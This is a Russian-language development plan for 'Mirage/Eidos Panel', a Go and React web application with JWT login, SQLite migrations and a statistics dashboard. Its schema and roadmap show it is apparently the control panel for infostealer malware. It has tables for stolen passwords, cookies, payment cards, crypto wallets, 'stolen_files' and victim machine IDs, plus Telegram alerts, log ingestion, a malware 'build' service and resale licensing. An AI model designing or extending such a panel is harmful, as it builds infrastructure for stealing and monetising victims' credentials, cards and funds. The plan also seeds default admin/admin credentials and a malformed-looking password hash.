# Phase 0: Foundation — Execution Plan

**Цель:** Рабочий скелет — Go сервер отдаёт React SPA, работает логин, пустой Dashboard.  
**Оценка:** 3 дня | **Версии:** Go 1.25.6, Vite 8.0.16, React 19.2.7, shadcn/ui 3.5.0, chi/v5 5.3.0  
**Подготовлено:** 2026-07-02 | **Статус:** ⬜ Not started

---

## Day 1: Go Backend Skeleton

### 1.1 Инициализация Go модуля

```bash
cd Mirage.Panel
go mod init github.com/user/mirage-panel

go get github.com/go-chi/chi/v5@v5.3.0
go get modernc.org/sqlite@v1.8.3
go get github.com/golang-jwt/jwt/v5@v5.3.1
go get github.com/gorilla/websocket@v1.5.3
go get golang.org/x/crypto  # bcrypt
```

Зависимости | Назначение
--|--
`chi/v5` | HTTP роутер с subrouter + middleware
`modernc.org/sqlite` | Pure-Go SQLite (без CGO)
`golang-jwt/v5` | JWT (HS256)
`gorilla/websocket` | WebSocket hub
`golang.org/x/crypto` | BCrypt для паролей

### 1.2 `cmd/panel/main.go` — Entry point

```
• Обработка сигналов: SIGINT/SIGTERM → graceful shutdown (30s timeout)
• Чтение конфига: os.Getenv("PORT"), os.Getenv("DB_PATH"), os.Getenv("JWT_SECRET")
• Инициализация SQLite: db.OpenDB(path) → *sql.DB
• Запуск миграций: db.RunMigrations(db)
• Создание chi.NewRouter()
• Подключение глобальных middleware:
  └─ chimw.RequestID — UUID на каждый запрос
  └─ chimw.RealIP — X-Forwarded-For
  └─ chimw.Logger — slog-based
  └─ chimw.Recoverer — panic → 500
  └─ chimw.Timeout(30s)
  └─ cors.Handler(...) — для Vite dev на :5173
• Монтирование /api роутов через RouteGroup:
  └─ POST /api/auth/login → без JWT
  └─ r.Group с authMiddleware:
      ├─ GET /api/stats
      ├─ GET /api/sessions
      └─ ...
• //go:embed frontend/dist/* для статики (production)
• http.Server с graceful shutdown
```

### 1.3 `internal/db/sqlite.go` — Database layer

```go
func OpenDB(path string) (*sql.DB, error)
func RunMigrations(db *sql.DB) error
```

- OpenDB: `sql.Open("sqlite", path)` + `PRAGMA journal_mode=WAL` + `PRAGMA busy_timeout=5000`
- RunMigrations: читает `.sql` файлы из `internal/db/migrations/`, сортирует по имени, выполняет каждый в транзакции, записывает хеш выполненной миграции в `_migrations` таблицу

**Миграции (4 файла):**

| Файл | Таблицы |
|------|---------|
| `001_users.sql` | `users` (id, username, password_hash, role, created_at) + дефолтный admin |
| `002_sessions.sql` | `sessions`, `passwords`, `cookies`, `cards`, `wallets`, `stolen_files`, `system_info` + индексы |
| `003_settings.sql` | `settings` (key PK, value TEXT) |
| `004_bans.sql` | `bans` (id, ip, reason, banned_at) + индекс по ip |

### 1.4 `internal/auth/jwt.go` — Authentication

```go
type Claims struct {
    jwt.RegisteredClaims
    UserID string `json:"uid"`
    Role   string `json:"role"`
}

func GenerateToken(userID, role, secret string) (string, time.Time, error)
func ValidateToken(token, secret string) (*Claims, error)
func HashPassword(password string) (string, error)
func CheckPassword(password, hash string) bool
```

- HS256, 24h expiry, `iat` + `exp` стандартные
- BCrypt cost: 12
- Secret из переменной окружения `JWT_SECRET` (мин 32 байта)

### 1.5 `internal/api/auth.go` — Auth handler

```
POST /api/auth/login

Request:  { "username": "admin", "password": "secret" }
Response: { "token": "eyJ...", "expires_at": "2026-07-03T00:00:00Z" }

Логика:
  1. Rate limit: 5 req/min per IP (отдельный счётчик)
  2. Проверить ban: SELECT FROM bans WHERE ip = ?
  3. SELECT FROM users WHERE username = ?
  4. bcrypt.CompareHashAndPassword
  5. GenerateToken → 200
  6. Неудача +10 за час → IP в bans

Ошибки:
  401 → invalid credentials
  429 → слишком много попыток
  403 → IP забанен
```

### 1.6 `internal/middleware/` — Middleware stack

| Файл | Middleware | Что делает |
|------|-----------|------------|
| `auth.go` | `Auth(secret)` | Bearer token → ValidateToken → `context.WithValue(ctx, "claims", claims)` → next. 401 если нет/невалидный. `/api/auth/*` пропускает. |
| `ratelimit.go` | `RateLimit(max, window)` | Token bucket per IP. Очистка старых записей по таймеру каждые 60s. |
| `ban.go` | `BanCheck(db)` | SELECT ip FROM bans → 403. Кеш в памяти (map + TTL 30s), чтоб не дёргать БД каждый запрос. |
| `cors.go` | `CORS(origins)` | Разрешённые origins из `ALLOWED_ORIGINS` (env). Dev: `http://localhost:5173`. |

### 1.7 `internal/api/stats.go` — Stats handler (MVP)

```
GET /api/stats

Response:
{
  "sessions":     { "total": 0, "today": 0 },
  "passwords":    { "total": 0 },
  "cookies":      { "total": 0 },
  "cards":        { "total": 0 },
  "wallets":      { "total": 0 },
  "geo":          [],
  "browsers":     [],
  "timeline":     [],
  "top_domains":  []
}

SQL запросы:
  • SELECT COUNT(*) FROM sessions
  • SELECT COUNT(*) FROM sessions WHERE date(created_at) = date('now')
  • SELECT COUNT(*) FROM passwords
  • SELECT country_code, COUNT(*) as c FROM sessions GROUP BY country_code ORDER BY c DESC
  • SELECT browser, COUNT(*) as c FROM passwords GROUP BY browser ORDER BY c DESC
  • SELECT date(created_at) as d, COUNT(*) FROM sessions WHERE created_at > date('now', '-30 days') GROUP BY d
  • Упрощённый GROUP BY на url домене
```

### 1.8 `Makefile`

```makefile
.PHONY: dev build test clean

dev:
	@which air > /dev/null 2>&1 || go install github.com/air-verse/air@latest
	air

build:
	go build -o bin/eidos-panel ./cmd/panel

test:
	go test ./... -v -count=1

clean:
	rm -rf bin/ data/mirage.db data/mirage.db-*
```

---

## Day 2: Frontend Skeleton

### 2.1 Инициализация Vite + React + TypeScript

```bash
cd Mirage.Panel/web

# Создаём Vite проект в текущей папке
npm create vite@latest . -- --template react-ts

# Базовые зависимости
npm install

# Tailwind CSS v4 + плагин Vite
npm install tailwindcss @tailwindcss/vite

# React Query для запросов
npm install @tanstack/react-query

# React Router
npm install react-router-dom

# Дата-время
npm install date-fns

# Иконки
npm install lucide-react

# Чарты
npm install recharts

# shadcn/ui (стиль new-york, база radix)
npx shadcn@latest init -t vite -y --base radix --style new-york

# shadcn/ui компоненты для Phase 0
npx shadcn@latest add button card input label skeleton table
```

### 2.2 `vite.config.ts` — Proxy на Go backend

```ts
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import tailwindcss from '@tailwindcss/vite'
import path from 'path'

export default defineConfig({
  plugins: [react(), tailwindcss()],
  resolve: {
    alias: { '@': path.resolve(__dirname, './src') },
  },
  server: {
    port: 5173,
    proxy: {
      '/api':  { target: 'http://localhost:8080', changeOrigin: true },
      '/ws':   { target: 'ws://localhost:8080', ws: true },
      '/health': { target: 'http://localhost:8080' },
    },
  },
})
```

### 2.3 `src/index.css` — Tailwind v4 + dark theme

```css
@import "tailwindcss";
@plugin "tailwindcss-animate";

@custom-variant dark (&:is(.dark *));

:root {
  --background: oklch(1 0 0);
  --foreground: oklch(0.145 0 0);
  --card: oklch(1 0 0);
  --card-foreground: oklch(0.145 0 0);
  --primary: oklch(0.205 0 0);
  --primary-foreground: oklch(0.985 0 0);
  --muted: oklch(0.97 0 0);
  --muted-foreground: oklch(0.556 0 0);
  --border: oklch(0.922 0 0);
  --ring: oklch(0.87 0 0);
}

.dark {
  --background: oklch(0.145 0 0);
  --foreground: oklch(0.985 0 0);
  --card: oklch(0.145 0 0);
  --card-foreground: oklch(0.985 0 0);
  --primary: oklch(0.488 0.243 264.376);
  --primary-foreground: oklch(0.985 0 0);
  --muted: oklch(0.269 0 0);
  --muted-foreground: oklch(0.708 0 0);
  --border: oklch(0.269 0 0);
  --ring: oklch(0.488 0.243 264.376);
}

@theme inline {
  --color-background: var(--background);
  --color-foreground: var(--foreground);
  --color-card: var(--card);
  --color-card-foreground: var(--card-foreground);
  --color-primary: var(--primary);
  --color-primary-foreground: var(--primary-foreground);
  --color-muted: var(--muted);
  --color-muted-foreground: var(--muted-foreground);
  --color-border: var(--border);
  --color-ring: var(--ring);
  --radius-lg: 0.5rem;
}
```

### 2.4 `src/lib/api.ts` — API клиент

```ts
// Типы
interface ApiError { error: string; message?: string }
interface ApiResponse<T> { data?: T; error?: ApiError }

type HttpMethod = 'GET' | 'POST' | 'PUT' | 'DELETE'

// Клиент
class ApiClient {
  private baseURL: string

  constructor(baseURL = '') {
    this.baseURL = baseURL
  }

  private async request<T>(method: HttpMethod, path: string, body?: unknown): Promise<T> {
    const token = localStorage.getItem('token')
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    }
    const res = await fetch(`${this.baseURL}${path}`, {
      method,
      headers,
      body: body ? JSON.stringify(body) : undefined,
    })
    if (res.status === 401) {
      localStorage.removeItem('token')
      window.location.href = '/login'
      throw new Error('Unauthorized')
    }
    if (!res.ok) {
      const err = await res.json().catch(() => ({}))
      throw { status: res.status, ...err }
    }
    return res.json()
  }

  get<T>(path: string) { return this.request<T>('GET', path) }
  post<T>(path: string, body?: unknown) { return this.request<T>('POST', path, body) }
  put<T>(path: string, body?: unknown) { return this.request<T>('PUT', path, body) }
  del<T>(path: string) { return this.request<T>('DELETE', path) }
}

export const api = new ApiClient()
```

### 2.5 `src/lib/ws.ts` — WebSocket клиент

```ts
type WSEvent = { type: 'new_session'; data: any }
             | { type: 'stats_update'; data: any }
             | { type: 'pong' }

type WSCallback = (event: WSEvent) => void

class WSClient {
  private ws: WebSocket | null = null
  private reconnectAttempts = 0
  private maxReconnect = 3
  private callbacks: WSCallback[] = []

  connect(token: string) {
    const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:'
    const host = window.location.host
    this.ws = new WebSocket(`${proto}//${host}/ws?token=${token}`)

    this.ws.onmessage = (msg) => {
      const event = JSON.parse(msg.data) as WSEvent
      this.callbacks.forEach(cb => cb(event))
    }

    this.ws.onclose = () => {
      if (this.reconnectAttempts < this.maxReconnect) {
        const delay = Math.pow(2, this.reconnectAttempts) * 1000
        setTimeout(() => {
          this.reconnectAttempts++
          this.connect(token)
        }, delay)
      }
    }

    this.ws.onopen = () => { this.reconnectAttempts = 0 }
  }

  onEvent(cb: WSCallback) { this.callbacks.push(cb) }
  disconnect() { this.ws?.close(); this.ws = null }
}

export const wsClient = new WSClient()
```

### 2.6 `src/pages/Login.tsx`

```
+───────────────────────────────────────────────+
│                                               │
│               Eidos Panel                     │
│     ┌─────────────────────────────────┐       │
│     │  Username                        │       │
│     │  [________________________]      │       │
│     │  Password                        │       │
│     │  [________________________]      │       │
│     │                                   │       │
│     │  ┌─────────────────────────┐      │       │
│     │  │  Sign In                 │      │       │
│     │  └─────────────────────────┘      │       │
│     │                                   │       │
│     │  Error state: bg-red-500/10       │       │
│     │  Loading: spinner в кнопке        │       │
│     └─────────────────────────────────┘       │
│                                               │
+───────────────────────────────────────────────+

• POST /api/auth/login → save token → navigate to /
• Error: "Invalid credentials" / "Too many attempts" / "IP banned"
• После успеха: wsClient.connect(token)
```

### 2.7 `src/pages/Dashboard.tsx` — MVP

```
+───────────────────────────────────────────────+
│  Dashboard                                     │
│  ┌──────┬──────┬──────┬──────┐                │
│  │ 0    │ 0    │ 0    │ 0    │                │
│  │Sess. │Passw.│Cook. │Walls │                │
│  └──────┴──────┴──────┴──────┘                │
│  ┌──────────────────────────────────────┐     │
│  │ Timeline — No data yet               │     │
│  │                                      │     │
│  │ Empty state: "Waiting for first log" │     │
│  └──────────────────────────────────────┘     │
│  ┌────────────────────┬─────────────────┐     │
│  │ Geo — No data      │ Browser — No    │     │
│  └────────────────────┴─────────────────┘     │
+───────────────────────────────────────────────+

• GET /api/stats каждые 10s (react-query refetchInterval)
• WebSocket "stats_update" → invalidate query
• 4 stat cards через shadcn/ui Card
• Loading: <Skeleton /> компоненты
• Empty: "No data yet" с иконкой
```

### 2.8 `src/components/layout/` — Shell

```
┌──────────┬────────────────────────────────────┐
│ ☰ Logo   │  Topbar                            │
│          │  ├ 🟢 Connected ─── admin ▼         │
├──────────┼────────────────────────────────────┤
│ 🔲 Dash  │                                    │
│ 📋 Sess. │  Content (Outlet)                  │
│ 🏗 Build  │                                    │
│ 🔍Search │                                    │
│ ⚙ Set.   │                                    │
└──────────┴────────────────────────────────────┘

• sidebar.tsx: w-56, collapse → w-14 (md+)
  └─ nav items с lucide-react иконками + текст
  └─ active: bg-primary/10 text-primary
• topbar.tsx: connection status (🟢 / 🔴)
  └─ ping /health каждые 30s
  └─ user dropdown: logout
• shell.tsx: flex h-screen, sidebar + right column
```

### 2.9 `src/App.tsx` — Router

```tsx
import { createBrowserRouter, RouterProvider, Navigate } from 'react-router-dom'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'

const queryClient = new QueryClient()

function ProtectedRoute({ children }: { children: React.ReactNode }) {
  const token = localStorage.getItem('token')
  if (!token) return <Navigate to="/login" replace />
  return <>{children}</>
}

const router = createBrowserRouter([
  { path: '/login', element: <Login /> },
  {
    path: '/',
    element: <ProtectedRoute><Shell /></ProtectedRoute>,
    children: [
      { index: true, element: <Dashboard /> },
      { path: 'sessions', element: <Sessions /> },
      { path: 'sessions/:id', element: <SessionDetail /> },
      { path: 'build', element: <Build /> },
      { path: 'search', element: <Search /> },
      { path: 'settings', element: <Settings /> },
    ],
  },
])

export function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <RouterProvider router={router} />
    </QueryClientProvider>
  )
}
```

---

## Day 3: Integration & Polish

### 3.1 Production сборка

```bash
# Фронтенд → dist/
cd web && npm run build

# Go бинарник со встроенным фронтендом
cd .. && go build -o bin/eidos-panel ./cmd/panel

# Результат: один файл ~15 MB
./bin/eidos-panel --port 8080 --db data/mirage.db
```

### 3.2 SQL миграции

**001_users.sql**
```sql
CREATE TABLE IF NOT EXISTS users (
    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
    username TEXT NOT NULL UNIQUE,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL DEFAULT 'admin',
    created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

INSERT OR IGNORE INTO users (id, username, password_hash, role)
VALUES ('0000000000000001', 'admin',
    '$2a$12$LJ3m4ys3Lk0TSwHnbfOMiOXPm1Qlq5GzGkJlq5GzGkJlq5GzGk',
    'admin');
```

**002_sessions.sql**
```sql
CREATE TABLE IF NOT EXISTS sessions (
    id TEXT PRIMARY KEY,
    build_id TEXT,
    hwid TEXT,
    os TEXT,
    username TEXT,
    ip TEXT,
    country_code TEXT,
    created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS passwords (
    id TEXT PRIMARY KEY,
    session_id TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    url TEXT,
    username TEXT,
    password_value TEXT,
    browser TEXT
);

CREATE TABLE IF NOT EXISTS cookies ( /* ... */ );
CREATE TABLE IF NOT EXISTS cards ( /* ... */ );
CREATE TABLE IF NOT EXISTS wallets ( /* ... */ );
CREATE TABLE IF NOT EXISTS stolen_files ( /* ... */ );
CREATE TABLE IF NOT EXISTS system_info ( /* ... */ );

CREATE INDEX idx_sessions_created ON sessions(created_at DESC);
CREATE INDEX idx_passwords_session ON passwords(session_id);
CREATE INDEX idx_passwords_url ON passwords(url);
CREATE INDEX idx_cookies_session ON cookies(session_id);
```

**003_settings.sql**
```sql
CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY,
    value TEXT NOT NULL
);

INSERT OR IGNORE INTO settings (key, value) VALUES ('rate_limit', '100');
INSERT OR IGNORE INTO settings (key, value) VALUES ('telegram_token', '');
INSERT OR IGNORE INTO settings (key, value) VALUES ('telegram_chat_id', '');
```

**004_bans.sql**
```sql
CREATE TABLE IF NOT EXISTS bans (
    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
    ip TEXT NOT NULL,
    reason TEXT,
    banned_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_bans_ip ON bans(ip);
```

### 3.3 Тесты

| Тест | Файл | Что проверяет |
|------|------|---------------|
| JWT roundtrip | `internal/auth/jwt_test.go` | Generate → Validate → claims совпадают |
| JWT expired | `internal/auth/jwt_test.go` | Просроченный token → error |
| JWT wrong secret | `internal/auth/jwt_test.go` | Другой secret → error |
| Login success | `internal/api/auth_test.go` | POST /api/auth/login → 200 + token |
| Login wrong pw | `internal/api/auth_test.go` | POST /api/auth/login → 401 |
| Rate limit | `internal/middleware/ratelimit_test.go` | N+1 запрос → 429 |
| DB open + migrate | `internal/db/sqlite_test.go` | Open → migrate → таблицы существуют |
| Health | `cmd/panel/main_test.go` | GET /health → 200 |

### 3.4 .env (пример)

```env
PORT=8080
DB_PATH=data/mirage.db
JWT_SECRET=min-32-characters-long-secret-key-change-me!
AUTH_USERNAME=admin
AUTH_PASSWORD=admin
ALLOWED_ORIGINS=http://localhost:5173
RATE_LIMIT=100
```

---

## Deliverables Phase 0

```
📁 Mirage.Panel/
├── cmd/panel/main.go              ✅ Go сервер стартует на :8080
├── internal/
│   ├── api/
│   │   ├── auth.go                ✅ POST /api/auth/login
│   │   └── stats.go               ✅ GET /api/stats (MVP)
│   ├── middleware/
│   │   ├── auth.go                ✅ JWT Bearer validation
│   │   ├── ratelimit.go           ✅ Token bucket per IP
│   │   ├── ban.go                 ✅ IP ban check
│   │   └── cors.go                ✅ CORS for dev
│   ├── auth/jwt.go                ✅ JWT + BCrypt
│   ├── db/
│   │   ├── sqlite.go              ✅ OpenDB + RunMigrations
│   │   └── migrations/001-004.sql ✅ 4 миграции
│   └── ws/                        — (заготовка)
├── web/
│   ├── src/
│   │   ├── pages/
│   │   │   ├── Login.tsx          ✅ Страница логина
│   │   │   └── Dashboard.tsx      ✅ 4 stat cards + empty states
│   │   ├── components/layout/
│   │   │   ├── sidebar.tsx        ✅ Sidebar с навигацией
│   │   │   ├── topbar.tsx         ✅ Connection status + logout
│   │   │   └── shell.tsx          ✅ Layout shell
│   │   ├── lib/
│   │   │   ├── api.ts             ✅ API клиент
│   │   │   └── ws.ts              ✅ WebSocket клиент
│   │   └── App.tsx                ✅ Router + ProtectedRoute
│   ├── package.json               ✅ Vite 8 + React 19 + shadcn/ui
│   └── vite.config.ts             ✅ Proxy на :8080
├── go.mod
├── .env.example
└── Makefile                       ✅ dev / build / test / clean
```

---

## Что НЕ входит в Phase 0

| Фича | Будет в |
|------|---------|
| Sessions list + table | Phase 2 |
| SessionDetail tabs | Phase 2 |
| Search | Phase 3 |
| Log ingestion | Phase 4 |
| Build service | Phase 5 |
| SSP | Phase 6 |
| WebSocket hub (полный) | Phase 4 |
| PostgreSQL | Phase 7 |
| Multi-user + licensing | Phase 8 |

---

## Команды для старта

```bash
# Dev: Go backend с hot-reload + Vite HMR
cd Mirage.Panel
make dev &
cd web && npm run dev

# Тесты
make test

# Production билд (один бинарник)
cd web && npm run build
cd .. && make build
./bin/eidos-panel
```
